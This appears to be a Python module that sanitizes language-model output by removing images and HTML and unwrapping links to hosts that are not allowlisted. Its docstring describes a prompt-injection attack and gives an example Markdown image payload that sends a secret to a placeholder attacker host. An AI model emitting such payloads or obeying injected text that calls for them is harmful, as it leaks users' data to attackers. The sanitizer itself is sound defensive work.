"""Make model output safe to render: no images, no unknown links.

A prompt-injected answer can smuggle data out through Markdown:
rendering ![x](https://attacker.example/?q=<secret>) makes the
user's browser send the secret to the attacker, no click needed.
The fix does not depend on the model behaving: strip what the
client would otherwise fetch or invite the user to follow.
"""

import re
from dataclasses import dataclass, field
from urllib.parse import urlparse

IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
HTML_TAG = re.compile(
    r"<\s*/?\s*(img|iframe|script|a|link)\b[^>]*>", re.I
)
LINK = re.compile(r"\[([^\]]+)\]\(([^)\s]+)[^)]*\)")
BARE_URL = re.compile(r"https?://[^\s)\]>]+")


@dataclass
class Sanitized:
    text: str
    removed: list[str] = field(default_factory=list)


# [start:sanitize]
def allowed(url: str, hosts: frozenset[str]) -> bool:
    host = (urlparse(url).hostname or "").lower()
    return any(host == h or host.endswith("." + h) for h in hosts)


def sanitize(text: str, hosts: frozenset[str]) -> Sanitized:
    """Remove images and HTML; unwrap links to unknown hosts."""
    out = Sanitized(text)

    def drop(m: re.Match[str]) -> str:
        out.removed.append(m.group(0))
        return ""

    def link(m: re.Match[str]) -> str:
        if allowed(m.group(2), hosts):
            return m.group(0)
        out.removed.append(m.group(2))
        return m.group(1)  # keep the words, lose the target

    def bare(m: re.Match[str]) -> str:
        if allowed(m.group(0), hosts):
            return m.group(0)
        out.removed.append(m.group(0))
        return "[link removed]"

    text = IMAGE.sub(drop, text)
    text = HTML_TAG.sub(drop, text)
    text = LINK.sub(link, text)
    # Bare URLs, skipping the ones kept inside allowed links.
    parts = re.split(r"(\[[^\]]+\]\([^)]*\))", text)
    text = "".join(
        p if p.startswith("[") else BARE_URL.sub(bare, p) for p in parts
    )
    out.text = text.strip()
    return out


# [end:sanitize]
